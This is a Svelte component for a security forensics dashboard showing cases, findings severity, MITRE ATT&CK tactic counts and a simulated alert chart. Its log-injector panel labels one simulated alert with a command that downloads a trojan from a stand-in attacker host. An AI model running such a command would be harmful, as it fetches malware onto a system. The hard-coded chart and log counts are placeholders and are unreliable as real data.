<script lang="ts">
  import { 
    AlertOctagon, 
    FolderKanban, 
    ClipboardList, 
    ShieldCheck, 
    FileSpreadsheet, 
    Plus 
  } from 'lucide-svelte';
  import type { Case, TimelineEvent, Finding, Evidence } from '../types';

  // Svelte 5 props
  const { 
    cases = [], 
    events = [], 
    findings = [], 
    evidence = [], 
    onQuickInject, 
    onNavigateToCase, 
    onCreateCase 
  } = $props();

  // Reactive derivations using Svelte 5 $derived
  const activeCasesCount = $derived(cases.filter(c => c.status !== "Resolved").length);
  const criticalFindingsCount = $derived(findings.filter(f => f.severity === "Critical").length);
  const highFindingsCount = $derived(findings.filter(f => f.severity === "High").length);
  const totalLogsCount = $derived(events.length * 3 + 12); // simulated logs count
  const openFindingsCount = $derived(findings.length);

  const securityScoreCalculated = $derived(Math.max(
    10,
    98 - (criticalFindingsCount * 12) - (highFindingsCount * 6) - (findings.filter(f => f.severity === "Medium").length * 3)
  ));

  const severityBreakdown = $derived({
    Critical: findings.filter(f => f.severity === "Critical").length,
    High: findings.filter(f => f.severity === "High").length,
    Medium: findings.filter(f => f.severity === "Medium").length,
    Low: findings.filter(f => f.severity === "Low").length,
  });

  const hourlyData = [
    { hour: "09:00", count: 4 },
    { hour: "10:00", count: 8 },
    { hour: "11:00", count: 18 },
    { hour: "12:00", count: 5 },
    { hour: "13:00", count: 12 },
    { hour: "14:00", count: 14 },
    { hour: "15:00", count: 9 },
  ];

  const maxHourlyCount = Math.max(...hourlyData.map(h => h.count)) || 1;

  const mitreBreakdown = $derived({
    "Initial Access": events.filter(e => e.category === "Initial Access").length,
    "Execution": events.filter(e => e.category === "Execution").length,
    "Credential Access": events.filter(e => e.category === "Credential Access").length,
    "Privilege Escalation": events.filter(e => e.category === "Privilege Escalation").length,
    "Exfiltration": events.filter(e => e.category === "Exfiltration").length,
    "Other": events.filter(e => e.category && !["Initial Access", "Execution", "Credential Access", "Privilege Escalation", "Exfiltration"].includes(e.category)).length,
  });
</script>

<div id="dashboard-container" class="space-y-6">
  <!-- Dynamic Summary Cards -->
  <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
    
    <!-- Active Cases -->
    <div id="stat-active-cases" class="bg-zinc-50 p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between">
      <div class="space-y-1">
        <span class="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Active Cases</span>
        <p class="text-2xl font-bold font-sans text-slate-900">{activeCasesCount}</p>
        <p class="text-[10px] text-slate-400">Investigations ongoing</p>
      </div>
      <div class="h-10 w-10 bg-violet-100/60 rounded-xl flex items-center justify-center text-violet-600 border border-violet-200/50">
        <FolderKanban class="h-5 w-5" />
      </div>
    </div>

    <!-- High Severity Findings -->
    <div id="stat-high-findings" class="bg-zinc-50 p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between">
      <div class="space-y-1">
        <span class="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Open Findings</span>
        <p class="text-2xl font-bold font-sans text-slate-900">{openFindingsCount}</p>
        <p class="text-[10px] text-rose-500 font-medium">🛡️ {criticalFindingsCount} Critical priorities</p>
      </div>
      <div class="h-10 w-10 bg-rose-100/60 rounded-xl flex items-center justify-center text-rose-600 border border-rose-200/50">
        <AlertOctagon class="h-5 w-5 animate-pulse" />
      </div>
    </div>

    <!-- Total Extracted Logs -->
    <div id="stat-imported-logs" class="bg-zinc-50 p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between">
      <div class="space-y-1">
        <span class="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Imported Logs</span>
        <p class="text-2xl font-bold font-sans text-slate-900">{totalLogsCount}</p>
        <p class="text-[10px] text-slate-400">Parsed forensic streams</p>
      </div>
      <div class="h-10 w-10 bg-blue-100/60 rounded-xl flex items-center justify-center text-blue-600 border border-blue-200/50">
        <FileSpreadsheet class="h-5 w-5" />
      </div>
    </div>

    <!-- Timeline Events -->
    <div id="stat-timeline-events" class="bg-zinc-50 p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between">
      <div class="space-y-1">
        <span class="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Timeline Events</span>
        <p class="text-2xl font-bold font-sans text-slate-900">{events.length}</p>
        <p class="text-[10px] text-emerald-600 font-medium">{events.filter(e => e.isSuspicious).length} indicators flagged</p>
      </div>
      <div class="h-10 w-10 bg-emerald-100/60 rounded-xl flex items-center justify-center text-emerald-600 border border-emerald-200/50">
        <ClipboardList class="h-5 w-5" />
      </div>
    </div>

    <!-- Security / Posture Score -->
    <div id="stat-security-score" class="bg-white p-4.5 rounded-2xl border border-slate-200 shadow-sm flex items-center justify-between col-span-1">
      <div class="space-y-1">
        <span class="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Security Score</span>
        <p class="text-2xl font-bold font-sans text-slate-900">{securityScoreCalculated}%</p>
        <p class="text-[10px] text-slate-500 font-medium">Confidence posture</p>
      </div>
      <div class="h-11 w-11 rounded-xl flex flex-col items-center justify-center border {
        securityScoreCalculated > 80 ? 'bg-emerald-50 text-emerald-600 border-emerald-200' :
        securityScoreCalculated > 50 ? 'bg-amber-50 text-amber-600 border-amber-200' : 'bg-red-50 text-red-600 border-red-200'
      }">
        <ShieldCheck class="h-5 w-5" />
      </div>
    </div>

  </div>

  <!-- Main Charts block -->
  <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
    
    <!-- SVG Interactive Event Timeline Chart -->
    <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm col-span-2">
      <div class="flex items-center justify-between mb-4">
        <div>
          <h3 class="text-xs uppercase font-bold tracking-wider text-slate-400">Forensics Analytics</h3>
          <h4 class="text-sm font-bold text-slate-800">Host Threat Event Density (Last 24 Hours)</h4>
        </div>
        <span class="text-[10px] font-mono font-semibold text-violet-700 bg-violet-100 border border-violet-200 px-2 py-0.5 rounded-full">Hourly Frequency</span>
      </div>

      <div class="h-44 relative w-full pt-4 flex items-end justify-between">
        {#each hourlyData as data}
          {@const rectHeight = (data.count / maxHourlyCount) * 80}
          <div class="flex flex-col items-center flex-1 group">
            <div class="text-[10px] font-mono text-slate-500 mb-1 font-bold opacity-0 group-hover:opacity-100 transition-opacity bg-slate-900 text-white rounded px-1.5 py-0.5 absolute -translate-y-8 pointer-events-none z-10">
              {data.count} alerts
            </div>
            <div 
              style="height: {rectHeight}%" 
              class="w-8 bg-gradient-to-t from-violet-200 to-violet-300 rounded-md hover:from-violet-400 hover:to-violet-500 transition-all border border-violet-100 cursor-pointer"
            ></div>
            <span class="text-[10.5px] font-mono text-slate-400 mt-2 font-medium">{data.hour}</span>
          </div>
        {/each}
      </div>
    </div>

    <!-- Severity Gauge Distribution -->
    <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
      <h3 class="text-xs uppercase font-bold tracking-wider text-slate-400">Risk Assessment</h3>
      <h4 class="text-sm font-bold text-slate-800 mb-4">Findings Severity Weight</h4>
      
      <div class="space-y-3 pt-2">
        <div>
          <div class="flex items-center justify-between text-xs mb-1">
            <span class="flex items-center gap-1.5 font-medium text-rose-700"><span class="w-2 h-2 rounded-full bg-rose-500"></span> Critical</span>
            <span class="font-mono font-semibold">{severityBreakdown.Critical}</span>
          </div>
          <div class="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
            <div class="h-full bg-rose-400 rounded-full" style="width: {findings.length ? (severityBreakdown.Critical / findings.length) * 100 : 0}%"></div>
          </div>
        </div>

        <div>
          <div class="flex items-center justify-between text-xs mb-1">
            <span class="flex items-center gap-1.5 font-medium text-amber-700"><span class="w-2 h-2 rounded-full bg-amber-500"></span> High</span>
            <span class="font-mono font-semibold">{severityBreakdown.High}</span>
          </div>
          <div class="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
            <div class="h-full bg-amber-300 rounded-full" style="width: {findings.length ? (severityBreakdown.High / findings.length) * 100 : 0}%"></div>
          </div>
        </div>

        <div>
          <div class="flex items-center justify-between text-xs mb-1">
            <span class="flex items-center gap-1.5 font-medium text-sky-700"><span class="w-2 h-2 rounded-full bg-sky-500"></span> Medium</span>
            <span class="font-mono font-semibold">{severityBreakdown.Medium}</span>
          </div>
          <div class="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
            <div class="h-full bg-sky-300 rounded-full" style="width: {findings.length ? (severityBreakdown.Medium / findings.length) * 100 : 0}%"></div>
          </div>
        </div>

        <div>
          <div class="flex items-center justify-between text-xs mb-1">
            <span class="flex items-center gap-1.5 font-medium text-slate-600"><span class="w-2 h-2 rounded-full bg-slate-400"></span> Low</span>
            <span class="font-mono font-semibold">{severityBreakdown.Low}</span>
          </div>
          <div class="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
            <div class="h-full bg-slate-300 rounded-full" style="width: {findings.length ? (severityBreakdown.Low / findings.length) * 100 : 0}%"></div>
          </div>
        </div>
      </div>
    </div>

  </div>

  <!-- MITRE ATT&CK & Injections Grid -->
  <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">

    <!-- MITRE ATT&CK Breakdown -->
    <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm col-span-2">
      <h3 class="text-xs uppercase font-bold tracking-wider text-slate-400">Security Architecture</h3>
      <h4 class="text-sm font-bold text-slate-800 mb-4">MITRE ATT&CK Technique Alignments</h4>
      <div class="grid grid-cols-2 sm:grid-cols-3 gap-3">
        {#each Object.entries(mitreBreakdown) as [tactic, count]}
          <div class="p-3 rounded-xl border flex flex-col justify-between {
            count > 0 ? 'bg-violet-50/70 border-violet-100' : 'bg-slate-50/50 border-slate-100'
          }">
            <span class="text-[10px] font-bold text-slate-400 uppercase tracking-wider">{tactic}</span>
            <div class="flex items-baseline gap-1 mt-2">
              <span class="text-xl font-bold font-mono {count > 0 ? 'text-violet-700' : 'text-slate-400'}">
                {count}
              </span>
              <span class="text-[9px] text-slate-400">mapped</span>
            </div>
          </div>
        {/each}
      </div>
    </div>

    <!-- Quick-play threats inject trigger panel -->
    <div class="bg-[#EDE9FE]/50 border border-violet-100 p-5 rounded-2xl flex flex-col justify-between space-y-4">
      <div>
        <span class="text-[10px] uppercase font-bold text-violet-700 tracking-wider flex items-center gap-1">
          <span class="w-2 h-2 rounded-full bg-violet-500 animate-ping"></span> Real-Time Sandbox Simulator
        </span>
        <h4 class="text-sm font-bold text-slate-900 mt-1">Attack Log Injector</h4>
        <p class="text-xs text-slate-600 mt-2 leading-relaxed">
          Inject standard security alert logs to live-test our real-time findings rules, database updates, and timeline mapping.
        </p>
      </div>

      <div class="space-y-2">
        <button
          id="inject-ransomware"
          onclick={() => onQuickInject("ransomware")}
          class="w-full text-left p-2.5 bg-white hover:bg-violet-50 border border-violet-100 rounded-xl text-xs flex items-center justify-between transition-all group font-medium cursor-pointer"
        >
          <div>
            <span class="text-rose-600 font-bold block">🚨 Trojan Executable Downloaded</span>
            <span class="text-[10px] text-slate-500 font-mono mt-0.5">wget http://attacker.xyz/trojan_pack.exe</span>
          </div>
          <span class="text-violet-400 group-hover:text-violet-600 group-hover:rotate-90 transition-transform">➕</span>
        </button>

        <button
          id="inject-bruteforce"
          onclick={() => onQuickInject("bruteforce")}
          class="w-full text-left p-2.5 bg-white hover:bg-violet-50 border border-violet-100 rounded-xl text-xs flex items-center justify-between transition-all group font-medium cursor-pointer"
        >
          <div>
            <span class="text-amber-600 font-bold block">🎫 SSH Credential Stuffing Burst</span>
            <span class="text-[10px] text-slate-500 font-mono mt-0.5">45 Access Failures over Port 22</span>
          </div>
          <span class="text-violet-400 group-hover:text-violet-600 group-hover:rotate-90 transition-transform">➕</span>
        </button>
      </div>
    </div>

  </div>

  <!-- Active Investigations Cases Row Table -->
  <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
    <div class="flex items-center justify-between mb-4">
      <h4 class="text-sm font-bold text-slate-800">Current Ongoing Cases</h4>
      <button 
        id="dash-create-case"
        onclick={onCreateCase}
        class="text-xs font-semibold px-3 py-1.5 bg-slate-900 border hover:bg-slate-800 text-white rounded-lg transition-colors flex items-center gap-1 cursor-pointer"
      >
        ➕ Start Incident Case
      </button>
    </div>

    <div class="overflow-x-auto">
      <table class="w-full text-left text-xs text-slate-600">
        <thead>
          <tr class="border-b border-slate-100 text-slate-400 uppercase tracking-widest text-[10px] font-bold">
            <th class="py-3 px-2">Case ID</th>
            <th class="py-3 px-2">Investigation Subject</th>
            <th class="py-3 px-2">Severity</th>
            <th class="py-3 px-2">Status</th>
            <th class="py-3 px-2">Launch Workspace</th>
          </tr>
        </thead>
        <tbody>
          {#each cases as c}
            <tr class="border-b border-slate-100 hover:bg-slate-50 transition-colors">
              <td class="py-3 px-2 font-mono font-bold text-slate-500">{c.id}</td>
              <td class="py-3 px-2">
                <p class="font-semibold text-slate-800">{c.title}</p>
                <p class="text-[10.5px] text-slate-400 truncate max-w-sm">{c.description}</p>
              </td>
              <td class="py-3 px-2">
                <span class="inline-block px-2.5 py-0.5 rounded text-[10.5px] font-bold capitalize border {
                  c.severity === 'Critical' ? 'bg-rose-50 text-rose-600 border-rose-100' :
                  c.severity === 'High' ? 'bg-amber-50 text-amber-600 border-amber-100' :
                  c.severity === 'Medium' ? 'bg-blue-50 text-blue-600 border-blue-100' : 'bg-slate-50 text-slate-600 border-slate-100'
                }">
                  {c.severity}
                </span>
              </td>
              <td class="py-3 px-2">
                <span class="inline-block px-2 py-0.5 rounded-full text-[10px] font-semibold {
                  c.status === 'Resolved' ? 'bg-emerald-50 text-emerald-600 border border-emerald-100' :
                  c.status === 'Investigating' ? 'bg-violet-50 text-violet-600 border border-violet-100' : 'bg-slate-100 text-slate-700'
                }">
                  • {c.status}
                </span>
              </td>
              <td class="py-3 px-2">
                <button
                  id="dash-goto-{c.id}"
                  onclick={() => onNavigateToCase(c.id)}
                  class="text-violet-600 hover:text-violet-900 font-bold hover:underline cursor-pointer"
                >
                  Investigate ➔
                </button>
              </td>
            </tr>
          {/each}
        </tbody>
      </table>
    </div>
  </div>
</div>
